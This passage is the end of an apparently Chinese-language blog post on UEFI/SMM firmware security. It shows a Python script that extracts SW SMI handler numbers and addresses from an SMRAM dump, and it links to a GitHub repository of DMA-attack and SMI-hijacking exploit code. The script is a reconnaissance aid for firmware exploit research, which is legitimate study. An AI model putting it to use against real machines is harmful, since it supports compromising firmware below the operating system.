<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Extract SW SMI handlers information from SMRAM dump.</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">$python smi_handlers.py TSEG.bin</span></span><br><span class="line"><span class="string">0x25: 0x893aaca0</span></span><br><span class="line"><span class="string">0x48: 0x893a3170</span></span><br><span class="line"><span class="string">0x01: 0x893a831c</span></span><br><span class="line"><span class="string">0x05: 0x893a7fa0</span></span><br><span class="line"><span class="string">0x03: 0x893a7e46</span></span><br><span class="line"><span class="string">0xf1: 0x893a7dd5</span></span><br><span class="line"><span class="string">0xf0: 0x893a7b76</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> sys, os, struct</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    data = <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment"># get range from string</span></span><br><span class="line">        data_at = <span class="keyword">lambda</span> offs, size: data[i + offs : i + offs + size]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># 00: &quot;DBRC&quot;</span></span><br><span class="line">        <span class="comment"># 68: handler address (qword)</span></span><br><span class="line">        <span class="comment"># 70: SW SMI value (byte)</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="keyword">if</span> data_at(<span class="number">0</span>, <span class="number">4</span>) == <span class="string">&#x27;DBRC&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            addr = struct.unpack(<span class="string">&#x27;Q&#x27;</span>, data_at(<span class="number">0x68</span>, <span class="number">8</span>))[<span class="number">0</span>]</span><br><span class="line">            val = struct.unpack(<span class="string">&#x27;B&#x27;</span>, data_at(<span class="number">0x70</span>, <span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> val != <span class="number">0</span> <span class="keyword">and</span> addr &lt; <span class="number">0xffffffff</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;0x%.2x: 0x%.8x&#x27;</span> % (val, addr)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>


<p>我把DMA攻击和SMI入口点修改的代码更新到UEFI引导脚本表的<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/UEFI_boot_script_expl">GitHub</a>库里了，祝你玩得开心:)</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/project/2023/08/09/Lenovo%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84SMM-callout%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
      title="Lenovo固件中的SMM callout漏洞利用"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Lenovo固件中的SMM callout漏洞利用
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
      title="UEFI 引导脚本表漏洞利用"
     >

    <p class="title-text">
      
        UEFI 引导脚本表漏洞利用
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Edvison<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/project/js/light-dark-switch.js"></script>
</body>
</html>
